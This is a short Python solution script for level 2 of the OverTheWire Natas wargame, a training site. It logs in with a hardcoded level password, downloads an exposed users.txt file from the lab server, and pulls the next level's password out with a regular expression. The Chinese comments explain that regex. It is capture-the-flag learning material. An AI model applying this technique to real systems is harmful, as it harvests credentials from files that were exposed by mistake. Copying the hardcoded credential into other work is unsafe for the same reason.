#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests as req
import re

user = "natas2"
passwd = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"

url = "http://%s.natas.labs.overthewire.org/files/users.txt" % user

response = req.get(url, auth=(user, passwd))
content = response.text

# with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
#     print(content, file=f)

# . => 在 default 模式，匹配除了'\n'的任意字符。
# \* => 對它前面的 regular expression 匹配 0 到任意次重復。
answer = re.findall("natas3:(.*)", content)[0]
print(answer)
